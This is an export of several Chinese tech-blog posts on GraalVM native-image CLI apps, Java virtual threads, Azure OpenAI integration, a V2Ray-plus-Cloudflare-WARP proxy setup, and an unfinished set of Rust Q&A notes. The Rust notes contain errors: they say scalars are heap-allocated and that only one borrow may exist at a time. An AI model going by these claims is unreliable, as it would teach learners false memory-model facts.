[{"content":"写在前面 云原生声量最大的一段时间里 Java 时常被人诟病应用启动速度太慢了，而且占用内存也很大，由于云原生应用目标包括快速启动、快速响应、快速扩容、快速收缩，因此 Java 一直被认为不适合云原生应用。但是，随着 GraalVM 的曝光，这个问题得到了部分解决，GraalVM 可以将 Java 应用编译成本地可执行文件，它被称为 Native Image，这样就不需要安装 Java 运行时（JRE）了，直接运行即可。\n最早体验到 Native Image 是通过 Quarkus 与 Picocli 开发一些命令行应用（CLI App），个人感觉针对不同的平台打包出不同的二进制文件的编译和部署成本比 Go/Rust/Node.js 语言都高，Native Image 的限制也比较多，比如反射、动态代理、动态类加载等，不得不以声明式告诉 GraalVM 哪些类有哪些动态行为。后来 Spring Boot 也支持了 Native Image，那些老毛病健在，只不过生态规模更大罢了。\nGraalVM 能显著提升 Java 应用程序的性能还是挺可信的，比如 GraalVM for JDK 21 is here! 和 Migrating 10MinuteMail from Java to GraalVM Native，尤其相较于传统 JVM 应用的这两个指标：\n启动时间 startup time\n单位时间与内存的吞吐量 requests/GB-s\n先决条件 安装 Java 21 或更高版本，现在挺流行使用 SDKMAN! 安装和管理多版本 JDK，我习惯在 Download Azul JDKs 下载 OpenJDK。\n在 Windows 平台，在 WSL 之外，也可以只通过类似于 alias 的别名动态切换 JDK 版本，比如编辑 PowerShell 的 $profile 指向的文件： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # reload env path Function Refresh { $env:Path = [System.Environment]::GetEnvironmentVariable(\u0026#34;Path\u0026#34;, \u0026#34;Machine\u0026#34;) + \u0026#34;;\u0026#34; + [System.Environment]::GetEnvironmentVariable(\u0026#34;Path\u0026#34;, \u0026#34;User\u0026#34;) } Function SetJdk($version) { $env:JAVA_HOME = \u0026#34;C:\\Program Files\\Zulu\\zulu-$version\u0026#34; Refresh } Function Jdk8 { SetJdk 8 } Function Jdk21 { $env:GRAALVM_HOME = \u0026#34;C:\\Program Files\\Java\\graalvm-community-openjdk-21.0.1+12.1\u0026#34; SetJdk 21 } Set-Alias -Name j8 -Value Jdk8 Set-Alias -Name j21 -Value Jdk21 安装 GraalVM for JDK 21 或更高版本，个人通常在 GraalVM Community Edition 下载适用于各 Java 版本的社区版。\n若在 Windows 平台，还需要下载 Visual Studio，并在安装时勾选 Desktop development with C++ 等组件，详情参考 Installation on Windows Platforms。 一般来说，使用默认的安装路径在编译时可以绕过不少坑（Error: Failed to find xxx in a Visual Studio installation），不得不迁移 Visual Studio 到其它盘时，建议在命令提示符使用 mklink 创建符号链接，比如： 1 mklink /d \u0026#34;C:\\Program Files\\Microsoft Visual Studio\u0026#34; \u0026#34;D:\\Program Files\\Microsoft Visual Studio\u0026#34; 安装 Maven 或 Gradle。\nQuarkus + Picocli 与 Spring Boot 的 Spring Initializr 类似，Quarkus 也提供了生成快速开始项目的在线工具 code.quarkus.io，可以搜索选择依赖生成你的初始代码。为什么首选 picocli 与 quarkus 的整合包 quarkus-picocli？而不是单独添加它？因为它们的整合包已经帮你解决了构建 Native Image 时的一些问题，比如 java.lang.NoClassDefFoundError: \u0026hellip;，详情参考 quarkus-picocli # Native Image。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Command( name = \u0026#34;\u0026lt;your_command_name\u0026gt;\u0026#34;, description = \u0026#34;\u0026lt;your_command_descripiton\u0026gt;\u0026#34;, mixinStandardHelpOptions = true, version = \u0026#34;\u0026lt;your_command_version\u0026gt;\u0026#34; ) public class App implements Runnable { // your command options and parameters public static void main(String[] args) { var app = new App(); var cli = new CommandLine(app); int code = cli.execute(args); System.exit(code); } @Override public void run() { // your command logic } } 这是我最常用的命令行应用的模板之一，它只需要一个源文件 App.java，其中的方法 main 既是 Quarkus 应用程序也是 Picocli 命令行应用的入口，它的参数 args 会被传递给 Picocli 的 CommandLine 对象，而 CommandLine 对象会解析 args 并调用 App 对象的 run 方法，这样就可以在 run 方法中编写命令行应用的逻辑了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 . ├── mvnw ├── mvnw.cmd ├── pom.xml ├── README.md └── src ├── main │ ├── docker │ │ ├── Dockerfile.jvm │ │ ├── Dockerfile.legacy-jar │ │ ├── Dockerfile.native │ │ └── Dockerfile.native-micro │ ├── java │ │ └── dev │ │ └── example │ │ └── App.java │ └── resources │ └── application.properties └── test └── java └── dev └── example 为了使程序启动时看起来更像 CLI App，可以在 application.properties 添加：\n1 2 3 quarkus.banner.enabled=false quarkus.package.output-name=your- quarkus.package.runner-suffix=cli 从生成的项目代码不难发现 README.md 已经提示了如何构建 Native Image，此处不使用 Maven Wrapper，而是直接使用自定义安装并配置好环境变量的 Maven 工具：\n1 mvn package -Dnative 以 Windows 为例，构建成功（BUILD SUCCESS）后，可以在 target 目录下看到生成的二进制文件 your-cli.exe，在不同命令行 Shell 上前缀有所不同：\n若在 PowerShell 则输入 .\\your-cli.exe ... 运行\n若在命令提示符（cmd.exe）则输入 cmd /k your-cli.exe ... 运行\n遇到最多的是反射问题，以下是官方给出的理由：\n在构建本地可执行文件时，GraalVM 基于封闭世界的假设进行操作。它分析调用树并删除所有未直接使用的类/方法/字段。通过反射使用的元素不是调用树的一部分，因此它们会被死代码消除（在其他情况下，如果未直接调用）。要在本地可执行文件中包含这些元素，您需要显式地为反射注册它们。\n对于依赖反射来序列化/反序列化的类，可使用 @RegisterForReflection 注解来注册反射类：\n1 2 @RegisterForReflection record MyRecord(String id, String name) {} 详情参考 Registering for reflection。\nSpring Boot + Picocli 从 Spring Initializr 生成包含依赖 picocli-spring-boot-starter 的项目代码，我们需要两个源文件 App.java 和 Cmd.java，Spring Boot 的命令行应用的入口类需要实现接口 CommandLineRunner 和 ExitCodeGenerator，其中 CommandLineRunner 的 run 方法会被调用，而 ExitCodeGenerator 的 getExitCode 方法会返回退出码，这样就可以在 main 方法中调用 SpringApplication.exit 方法来退出程序了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Component @SpringBootApplication public class App implements CommandLineRunner, ExitCodeGenerator { private final Cmd cmd; private final IFactory factory; private int exitCode; public App(Cmd cmd, IFactory factory) { this.cmd = cmd; this.factory = factory; } @Override public void run(String... args) throws Exception { exitCode = new CommandLine(cmd, factory).execute(args); } @Override public int getExitCode() { return exitCode; } public static void main(String[] args) { System.exit(SpringApplication.exit(SpringApplication.run(App.class, args))); } } 具体业务逻辑在 Cmd.java 中实现，它需要实现接口 Callable\u0026lt;Integer\u0026gt;，其中 call 方法会被调用，返回值为退出码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Component @Command( name = \u0026#34;\u0026lt;your_command_name\u0026gt;\u0026#34;, description = \u0026#34;\u0026lt;your_command_descripiton\u0026gt;\u0026#34;, mixinStandardHelpOptions = true, version = \u0026#34;\u0026lt;your_command_version\u0026gt;\u0026#34; ) public class Cmd implements Callable\u0026lt;Integer\u0026gt; { // your command options and parameters @Override public Integer call() throws Exception { // your command logic return 0; } } 类似地，在 application.properties 设置 spring.main.banner-mode=off，然后在 HELP.md 可以发现如何构建 Native Image：\n1 mvn native:compile -Pnative 看起来编译时好好的，运行时却报错：\njava.lang.IllegalStateException: Failed to execute CommandLineRunner 解决方案是新增依赖 Picocli Code Generation，它是一个可用于生成构建 GraalVM Native Image 的 Picocli 命令所需元数据的注解处理器，以 Maven 为例：\n1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;info.picocli\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;picocli-codegen\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.7.5\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 由于使用了 HTTPS，不料遭遇了异常：\njava.net.MalformedURLException: Accessing an URL protocol that was not enabled. The URL protocol HTTPS is supported but not enabled by default. It must be enabled by adding the \u0026ndash;enable-url-protocols=https option to the native-image command. 于是在 native-maven-plugin 添加构建参数：\n1 2 3 4 5 6 7 8 9 \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.graalvm.buildtools\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;native-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;buildArgs\u0026gt; \u0026lt;arg\u0026gt;--enable-url-protocols=https\u0026lt;/arg\u0026gt; \u0026lt;/buildArgs\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; 还以万事大吉了，没想到有些用例在运行 jar 时没问题，而在运行 native image 时却异常，通过异常堆栈追踪源码仍然不好确定缺了哪些配置项或元数据，最终从 How to register method for runtime reflection with GraalVM? 得到启发，通过 native-image-agent 来修复，它是一个 Java Agent，可以在运行 jar 时生成元数据，然后在构建 native 时使用它们：\n1 2 3 4 5 6 7 8 src/main/resources/META-INF/native-image/ ├── agent-extracted-predefined-classes ├── jni-config.json ├── predefined-classes-config.json ├── proxy-config.json ├── reflect-config.json ├── resource-config.json └── serialization-config.json 操作步骤如下所示：\n运行 mvn -Pnative native:compile （编译通过后，假设在目录 target 下可执行文件和 jar 分别为 your-app 和 your-app.jar）\n新建目录 src/main/resources/META-INF/native-image 后运行 java -Dspring.aot.enabled=true -agentlib:native-image-agent=config-output-dir=./src/main/resources/META-INF/native-image -jar target/your-app.jar （若在 Windows 则注意路径写法，以及使用 -D\u0026quot;xxx\u0026quot; 代替 -Dxxx）\n尝试通过测试覆盖所有可能的控制流，以便在运行时文件 reflection-config.json 中包含关于反射调用的所有信息，完成后使用 Ctrl + C 停止应用程序\n再次运行 mvn -Pnative native:compile\n最终运行可执行文件 target/your-app\n参考资料 Quarkus # Native Reference Guide\nSpring # GraalVM Native Image Support\n本文首发于 https://h2cone.github.io\n","date":"2023-11-18T23:39:26+08:00","permalink":"https://h2cone.github.io/2023/11/18/your-own-graalvm-native-image-cli-app/","title":"造你自己的 GraalVM Native Image 命令行应用"},{"content":"为了解决什么问题？ 围绕 I/O 为核心的单机任务，难点之一是权衡应对负载增加的能力和开发的难易程度，从 网络·NIO 中我们可以看到，Blocking I/O 优点是概念简单，缺点是在 I/O 操作完成之前，线程将无法执行任何其他操作，另外一点容易忽视的是它经过 Java 堆复制数据；Java NIO 劣势是概念较复杂（考虑异步容易出错），优势是支持非阻塞 I/O 和分配直接内存。一般情况下，基于 NIO 的服务比基于 BIO 的服务性能表现更好，但阻塞式 I/O 对广大开发者的心智负担更低。\n使用非阻塞 I/O 模型难以避免引入异步编程或响应式编程，而这些范式对于开发者来说是一种挑战，因此许多主流语言都提供了将单线程阻塞式代码转化为异步、非阻塞式代码的语法糖，比如 C#/JavaScript 的 async/await：\n让出（yield）控制权给调用者线程。 尝试隐藏异步调用与同步调用的差异，使其看起来像同步代码那样简单。 是通过编译器自动将 async 方法转换为状态机来实现的。 详情参考 Task asynchronous programming model，随着越来越多的异步“传染”程序代码，性能提高代价可能是越来越难以推理代码。由于各种各样的原因，Java 官方没走 async/await 的道路，而是选择了类似于 Go/Kotlin 协程 的“绿色线程”。所谓“绿色”是相对于 OS 线程而言，其中 Java 的线程瓶颈尤为严重，已知 1 线程需要大小 1MB 的栈，那么 10000 线程大约消费 10 GB 内存，这类来自 OS 的瓶颈促使开发人员考虑线程池技术。随着负载的增加，Java 线程池的扩展又是一大挑战，官方正式推出的挑战者是虚拟线程。\n“每线程一请求”的崛起？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ExecutorService executor = Executors.newThreadPerTaskExecutor(Thread.ofVirtual().name(\u0026#34;my-thread\u0026#34;, 0).factory()); @Override public void run() { try (ServerSocket serverSocket = new ServerSocket(port)) { while (!Thread.interrupted()) { Socket socket = serverSocket.accept(); executor.submit(() -\u0026gt; handleRequest(socket)); } } catch (IOException e) { // ... } finally { executor.close(); } } 在开始之前需要先澄清若干概念：\n操作系统线程（OS thread）。由操作系统管理的数据结构。\n平台线程（Platform thread）。在 Java 19 之前，Thread 类的每个实例都是一个平台线程，是操作系统线程的包装器。创建一个平台线程就会创建一个操作系统线程，阻塞一个平台线程就会阻塞一个操作系统线程。\n虚拟线程（Virtual thread）。由 JVM 管理的轻量级线程。它们扩展了线程类，但不与特定的操作系统线程绑定。因此，虚拟线程的调度由 JVM 负责。\n载体线程（Carrier thread）。用于运行虚拟线程的平台线程称为载体线程。它不是一个有别于 Thread 或 VirtualThread 的类，而是一个功能名称。\nJVM 级别的虚拟线程调度器对于虚拟线程应用 M : N 调度（M:N scheduling），M 表示较多虚拟线程数，N 表示较少平台线程数，并且 JVM 在可垃圾回收的堆中使用 Java 对象来表示虚拟线程的栈帧。\n调度器调度虚拟线程时给虚拟线程挂载（mount） 平台线程，执行某些代码时卸载（unmount）平台线程（通常发生在执行阻塞式 I/O 操作），将它释放到 ForkJoinPool 维护的线程池，虚拟线程会被阻塞在 I/O 操作直到完成时才被调度器重新调度。\n阻塞或增加平台线程 ❌ 某些方法（例如 Object.wait()）会触发捕获载体线程（capture the carrier thread），引起载体线程 ⬆️ 阻塞或增加虚拟线程 ✅ 固定虚拟线程（pinned thead）：不卸载直到在 native method 或 synchronized code 返回，期间载体线程⬇️ 虚拟线程 API 设计倾向于减轻开发人员心智负担，将虚拟线程复杂度转移到平台和库，但使用时仍然有不少注意事项：\n以“每线程一请求”方式编写简单的同步代码，采用阻塞式 I/O API。\n将每个并发任务表示为一个虚拟线程，切勿池化虚拟线程。\n使用 Semaphore 限制并发数。\n不要在 ThreadLocal 中缓存昂贵的可重用对象。\n避免长时间或频繁固定虚拟线程。\n本文首发于 https://h2cone.github.io\n参考资料 Exploring the design of Java’s new virtual threads\nJEP 444: Virtual Threads\nOracle # Virtual Threads\nWhen Quarkus meets Virtual Threads\nQuarkus # VIRTUAL THREAD SUPPORT REFERENCE\nSpring # Embracing Virtual Threads\nHello, Java 21\nComparing Java Virtual Threads with Spring Reactive Webflux\n","date":"2023-09-26T22:32:39+08:00","permalink":"https://h2cone.github.io/2023/09/26/a-quick-look-at-virtual-threads/","title":"虚拟线程速览"},{"content":"写在前面 上个月参与公司将 LLM 应用到基于 Spring Boot 的业务系统差事：接入 ChatGPT。\nAzure OpenAI Service Azure OpenAI 服务允许通过 REST API 访问 OpenAI 的强大语言模型，包括 GPT-3、Codex 和 Embeddings 模型系列。 这些模型可以轻松适应特定的任务，包括但不限于内容生成、汇总、语义搜索和自然语言到代码的转换。用户可以通过 REST API、Python SDK 或 Azure OpenAI Studio 中基于 Web 的界面访问该服务。\n使用 Azure OpenAI 服务在大部分情况下不需要代理，无严格网络封锁。\n依赖库 后端 TheoKanning/openai-java。Java 中的 OpenAI GPT-3 API 客户端。\nknuddelsgmbh/jtokkit。JTokkit 是一个 Java 分词器库，设计用于 OpenAI 模型。\n前端 mpetazzoni/sse.js。一个灵活的 JavaScript SSE 库。 认证 与 OpenAI API 的 header 要求包含 Authorization: Bearer $OPENAI_API_KEY 不同的是，Azure OpenAI API 的 header 要求包含 api-key: $OPENAI_API_KEY，详情参考 Azure OpenAI Service REST API reference。\n提示与补全 在与 LLM 对话的过程中，流式响应体验比阻塞式响应好很多。\n1 2 3 4 5 6 7 8 9 10 public interface ChatApi extends OpenAiApi { @Streaming @POST(\u0026#34;{deployment}/chat/completions\u0026#34;) Call\u0026lt;ResponseBody\u0026gt; createChatCompletionStream( @Body ChatCompletionRequest request, @Path(\u0026#34;deployment\u0026#34;) String deployment, @Query(\u0026#34;api-version\u0026#34;) String version ); } 自定义 API 客户端与覆写接口可以使用 OpenAI API 风格的 Java 库调用 Azure OpenAI API。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 @Getter private ChatApi chatApi; private ChatApi chatApi() { OkHttpClient httpClient = new OkHttpClient.Builder().addInterceptor(chain -\u0026gt; { Request rawRequest = chain.request(); Request request = rawRequest.newBuilder() .header(headerName, StrUtil.isBlank(headerPrefix) ? key : headerPrefix + key) .header(Header.CONTENT_TYPE.getValue(), ContentType.JSON.getValue()) .method(rawRequest.method(), rawRequest.body()) .build(); return chain.proceed(request); }).addInterceptor(chain -\u0026gt; { Request request = chain.request(); Response response = chain.proceed(request); Assert.notNull(response); if (!response.isSuccessful()) { ResponseBody body = response.body(); String bodyStr = Objects.nonNull(body) ? body.string() : null; log.warn(\u0026#34;{} {} -\u0026gt; {} {} {}\u0026#34;, request.method(), request.url(), response.code(), response.message(), bodyStr); BaseResponse\u0026lt;?\u0026gt; baseResponse = JSONUtil.toBean(bodyStr, BaseResponse.class, true); if (Objects.nonNull(baseResponse.getError())) { String message = baseResponse.getError().getMessage(); log.error(\u0026#34;!chatApi|{}\u0026#34;, message); } ErrorCode.OPENAI_API_NOT_AVAILABLE.throwOut(); } return response; }) .connectTimeout(timeout, TimeUnit.SECONDS) .writeTimeout(timeout, TimeUnit.SECONDS) .readTimeout(timeout, TimeUnit.SECONDS) .build(); return new Retrofit.Builder() .baseUrl(baseUrl) .client(httpClient) .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) .addConverterFactory(JacksonConverterFactory.create(OBJECT_MAPPER)) .build() .create(ChatApi.class); } Chat API 客户端用法如下所示：\n1 2 3 4 5 6 @Override public Flowable\u0026lt;ChatCompletionsChunk\u0026gt; chatCompletionStream(ChatCompletionsRequest request) { request.setStream(true); String deployment = conf.modelDeployment.get(request.getModel()); return OpenAiService.stream(chatApi.createChatCompletionStream(request, deployment, conf.version), ChatCompletionsChunk.class); } SSE 接口 在 Spring Boot 程序开发 SSE 接口参考了 Server-Sent Events in Spring。\n1 2 3 4 5 6 7 8 9 10 11 12 13 @ApiOperation(\u0026#34;发送消息\u0026#34;) @PostMapping(\u0026#34;/conversation\u0026#34;) public SseEmitter conversation(@RequestBody ConversationParam param) throws InterruptedException { String username = JwtUtils.currentUser(); Assert.notBlank(username, ErrorCode.ACCOUNT_NOT_EXISTS); param.setUid(username); final SseEmitter emitter = new SseEmitter(); final SecurityManager securityManager = SecurityUtils.getSecurityManager(); param.setStream(true).setEmitter(emitter).setSecurityManager(securityManager); chatService.sendMessageAsync(param); return emitter; } 除了 SSE，也可以考虑使用 WebSocket 发送消息，ChatGPT 和 New Bing 是两派的代表。\n上下文淘汰 由于 gpt-3.5-turbo 的 Tokens 限制为 4096，一种粗暴的策略是当预计的对话上下文超过上限时丢弃较早的消息。\n1 2 3 while (conv_history_tokens + max_response_tokens \u0026gt;= token_limit): del conversation[1] conv_history_tokens = num_tokens_from_messages(conversation) 简言之，请求 Tokens + 最大响应 Tokens \u0026lt; 模型 Tokens 限制，其中 Tokens 计算参考：\n1 2 3 4 5 6 7 8 9 10 11 def num_tokens_from_messages(messages, model=\u0026#34;gpt-3.5-turbo-0301\u0026#34;): encoding = tiktoken.encoding_for_model(model) num_tokens = 0 for message in messages: num_tokens += 4 # every message follows \u0026lt;im_start\u0026gt;{role/name}\\n{content}\u0026lt;im_end\u0026gt;\\n for key, value in message.items(): num_tokens += len(encoding.encode(value)) if key == \u0026#34;name\u0026#34;: # if there\u0026#39;s a name, the role is omitted num_tokens += -1 # role is always required and always 1 token num_tokens += 2 # every reply is primed with \u0026lt;im_start\u0026gt;assistant return num_tokens 按升序丢弃消息可能会出现丢失与用户提示有关的消息或携带与用户提示不相关的内容发送到 LLM，结果是回复效果不好，调用成本较高。观察到市面上一些处理长文本的 LLM 应用使用 LlamaIndex (GPT Index) “绕过” Tokens 限制，它通过 Embeddings 模型与本地数据库查找与用户提示相关的段落，然后从这些段落中生成 Prompt 喂给 LLM。\n比 GPT Index 封装程度还高的另一个 Python 库 langchain 的玩法是真的多\u0026hellip;\u0026hellip;\n本文首发于 https://h2cone.github.io\n参考资料 Azure OpenAI Service Documentation\nWelcome to OpenAI\nHow to summarize a long text using GPT-3\nllama-index(gpt-index)：后chatgpt时代的对话式文档问答解决方案\n","date":"2023-04-26T13:54:13+08:00","permalink":"https://h2cone.github.io/2023/04/26/azure_openai_api_0/","title":"通过 Azure OpenAI API 接入 ChatGPT"},{"content":"🧱 有一阵子访问 OpenAI（现在更像 CloseAI） 的一些域名经常遇到 Cloudflare 的 Access Denied，一开始尝试更换机房 IP 来代理，可几乎没有一个不在黑名单。侥幸通过先走代理，在登录最后一步切换为直连绕过了数次，直到国内终于彻底被墙了。\n❓ 打不过就加入它：流量出站转向 Cloudflare 网络。\n在 VPS 上安装 WARP，以 Debian/Ubuntu 为例： 1 sudo apt install cloudflare-warp 以本地代理模式运行 WARP 1 2 3 4 warp-cli register warp-cli set-mode proxy warp-cli connect warp-cli enable-always-on 测试代理模式 1 curl ifconfig.me 留意前后标准输出的区别。\n1 2 export ALL_PROXY=socks5://127.0.0.1:40000 curl ifconfig.me 配置 V2Ray 设置路由规则，非国内域名走 WARP 代理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 { \u0026#34;routing\u0026#34;: { \u0026#34;domainStrategy\u0026#34;: \u0026#34;IPIfNonMatch\u0026#34;, \u0026#34;rules\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;outboundTag\u0026#34;: \u0026#34;reject\u0026#34;, \u0026#34;ip\u0026#34;: [ \u0026#34;geoip:private\u0026#34; ] }, { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;outboundTag\u0026#34;: \u0026#34;proxy\u0026#34;, \u0026#34;domain\u0026#34;: [ \u0026#34;geosite:geolocation-!cn\u0026#34; ] }, { \u0026#34;type\u0026#34;: \u0026#34;field\u0026#34;, \u0026#34;outboundTag\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;network\u0026#34;: \u0026#34;udp,tcp\u0026#34; } ] } } 其中 WARP 代理的出站标签是 proxy，使用 WARP 本地代理模式地址和端口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 { \u0026#34;outbounds\u0026#34;: [ { \u0026#34;tag\u0026#34;: \u0026#34;reject\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;blackhole\u0026#34; }, { \u0026#34;tag\u0026#34;: \u0026#34;proxy\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;socks\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;servers\u0026#34;: [ { \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;port\u0026#34;: 40000 } ] } }, { \u0026#34;tag\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;freedom\u0026#34; } ] } 由于在 V2Ray Server 与目标（例如 chat.openai.com）之间插入一层 Cloudflare WARP，因此向目标隐藏了 V2Ray Server 的真实地址。\n😅 运行一段时间后 VPS 经常罢工，连 SSH 都连不通，登录 Web 控制台才知道是 Memory 和 Swap 负载过高，好不容易连上后确定了凶手就是 Cloudflare WARP 客户端一个进程 warp-svc，不少网友说它容易内存泄漏，也没找到源代码，把我给气得直接使用 crontab 每分钟检查它消耗内存百分比是否超过指定阈值，若是则杀死它（反正会自动重启）。\n1 */1 * * * * kill -9 $(ps -C warp-svc --no-headers -o \u0026#34;pid,\\%mem\u0026#34; | awk \u0026#39;{ if ($2 \u0026gt; 40) print $1 }\u0026#39;) 注意命令中的百分比符号 % 除非用反斜杠 \\ 转义，否则将被 crontab 改变为换行符。\n🤖️ “总的来说，Cloudflare WARP 的本质是一个基于 WireGuard 协议的 VPN 服务，它通过加密和隧道技术来保护用户的隐私和安全，同时通过优化路由、缓存加速等技术来提高用户的网络性能和体验。”\n本文首发于 https://h2cone.github.io\n🔍 Announcing WARP for Linux and Proxy Mode\nUserspace WireGuard® Implementation in Rust\nA platform for building proxies to bypass network restrictions.\n","date":"2023-04-05T16:22:44+08:00","permalink":"https://h2cone.github.io/2023/04/05/proxy_with_warp/","title":"V2Ray + Cloudflare WARP"},{"content":"设问 先有 Rust 还是先有 Rust 编译器？ 第一个 Rust 编译器一定是用非 Rust 实现的，假设它叫引导编译器，巨佬用引导编译器来编译用 Rust 编写的 Rust 编译器源代码得到 Rust 实现的 Rust 编译器，从此以后的迭代开发无需引导编译器，而是基于 Rust 实现的 Rust 编译器。\n第一次看到 rust-lang/rust 就有这样的疑问，后来才想起来这种解决方案被称为自举。\n语句与表达式的区别？ 语句（statement）是执行某些动作的指令，无返回值；表达式（expression）被估算（evaluate）输出返回值。\n当在语句行尾处遇到 ; 时，其左邻的片段将被估算出返回值，该返回值又被 = 赋予某个变量，它们通常成对出现，若该片段不含分号，则它被看作是表达式。\n内存分配在哪里？ 基于堆的内存分配（heap-based memory allocation）或基于栈的内存分配（stack-based memory allocation）。赋值语句、函数调用等场景离不开给变量（的值）分配内存，很喜欢书中的餐厅隐喻，在栈上分配内存就像叠碟子，而堆上分配内存就像进入餐厅找空位。\n标量类型（scalar type）数值仅在堆上分配内存，比如整数、浮点数、布尔、字符，它们的长度固定的含义是在运行时比特序列长度不可变，换言之，在编译时就已经知道它们的大小。复合类型（Compound Types）中的元组和数组的长度固定，因此在栈上分配内存；相反，在编译时未知大小的数据或可能改变大小的数据必须被存储在堆上，而找到堆上数据的方法是通过栈上的指针的值——虚拟地址，地址为标量。总而言之，要么仅在栈上分配内存，要么既在栈上，又在堆上分配内存。\n每个小矩形内：栈在左，堆在右。 scalar 标量。 ptr 指针。 箭头：地址指向的位置。 len 长度。 cap 容量。 蓝色：len。 绿色：cap - len。 赋值语句或函数调用传参本质上是纯栈的数据拷贝? 如果在堆上的数据很大，那么堆的数据拷贝在运行时开销非常昂贵，一般情况下都是隐式 Copy，除非显式 Clone。\n什么是所有权？ 所有权（ownership）使 Rust 能够无需垃圾收集器的情况下保证内存安全。默认情况下，违反所有权规则会导致编译错误，所有权规则如下所述：\n每个值（value）都有一个所有者（owner）。\n一个所有者是一个变量。\n隐式只有一个所有者，显式支持多个所有者。\n当所有者超出作用域（variable scope）时，该值将被销毁（drop）。\n范围开始于左大括号 {, 结束于右大括号 }。\n通过实现 Drop 来销毁值。\n在规则之上，所有权可以在变量之间转移（move），用官方的例子来说，被其它变量夺走所有权的变量已无效。\n1 2 3 4 let s1 = String::from(\u0026#34;hello\u0026#34;); let s2 = s1; // This code does not compile! println!(\u0026#34;{}, world!\u0026#34;, s1); 传递函数参数或接收返回值时转移所有权很繁琐，不要恐慌，Rust 有使用一个值而不夺取所有权的特性：引用（reference），比如上文 1.4 插图第 3 列第 2 行。\n引用与指针的区别？ 指针指向一个内存地址，可以用来访问存储在该内存地址上的值，引用也类似，与指针不同的是，引用保证在引用的有效期内指向一个特定类型的有效值（编译时检查），引用的规则如下所述：\n一个变量只能有一个可变（mutable）引用，或多个不可变（immutable）引用。\n一个引用是一个变量。\n声明变量时，它的值默认是不可变的，即只读，除非使用 mut 修饰才可写。\n引用必须始终有效（valid），参考生命周期。\n什么是借用？ 借用（borrow）是指在不拥有所有权的情况下，从一个变量中借用它的值。这意味着，在某个时刻，只能有一个变量对它进行借用。这样做可以避免数据竞争，同时也提供了灵活性，因为多个变量可以对同一个值进行借用。\n画图太麻烦了，直接借用 Graphical depiction of ownership and borrowing in Rust。\n什么是数据竞争？ 数据竞争（data race）是指在多个线程同时访问同一个变量时，由于线程之间的执行顺序无法预知，可能会导致结果不可预测或错误的情况，发生数据竞争有三个条件：\n两个或多个进程/线程/协程并发访问相同的变量。\n至少有一个访问是写入。\n没有同步访问机制。\n什么是生命周期？ 变量在作用域中从初始化到销毁的整个过程称之为生命周期（lifetime）。生命周期主要目的是防止“悬挂引用”和“悬空指针”错误，比如当多个指针指向一个地址时，通过一个指针销毁了该地址的数据，另一个指针就产生了悬挂引用，我们可以使用生命周期注解来确保引用在我们需要时有效。\nString 与 \u0026amp;str 的区别？ String 和 \u0026amp;str 是 Rust 中的两种不同的字符串类型：\nString 类型表示一个可变的、UTF-8 编码的字符串。它是一个类型安全的、动态分配内存的字符串类型，可以随时扩展或收缩字符串的长度。String 类型可以随时被修改，并且它的所有权在整个程序的生命周期内都被保持。\n\u0026amp;str 类型表示一个不可变的、UTF-8 编码的字符串，它是一个指向字符串数据的指针。由于 \u0026amp;str 类型是不可变的，因此它不能被修改，也不能扩展或收缩字符串的长度。\u0026amp;str 类型可以被当作一个只读的字符串值来使用，但是它不能被修改。\n什么是 Monomorphization？ Monomorphization 是一种编译器优化技术，它的目的是将多态代码（即具有多种可能类型的代码）转换为单态代码（即只有一种可能类型的代码）。这样做的好处是可以提高代码的执行效率，因为单态代码可以被编译器更好地优化。\n什么是 Blanket implementations？ Blanket implementations 是指在 Rust 编程语言中，为一类类型实现一个 trait（即接口）的方法，使得这一类类型都可以使用这个 trait 的方法。这种方法可以让开发者更方便地定义一组类型所共有的行为，并且可以让这些类型在运行时具有更高的性能。\n迭代器比循环快？ 在某些情况下，使用迭代器（iterator）可能比使用循环（loop）执行得更快。这是因为迭代器可以让编译器进行更多的优化，例如预先计算迭代次数并对循环进行展开（unrolling），从而减少了运行时的开销。此外，迭代器还可以更高效地处理大型数据集，因为它只会在需要时才加载和处理数据。\n有哪些零成本抽象？ 零成本抽象是指在编译时执行的抽象操作，不会带来额外的运行时开销。Rust 中有多种零成本抽象的实现方式，包括但不限于：\nTraits：traits 是 Rust 中的接口类型，可以用来定义一组类型所共有的行为。使用 traits 可以在编译时将多态代码转换为单态代码，从而提高代码的执行效率。 Generics：generics 是 Rust 中的泛型类型，可以用来定义支持多种类型的代码。使用 generics 可以在编译时为每种类型生成不同的代码版本，从而避免在运行时进行类型检查。 Closures：closures 是 Rust 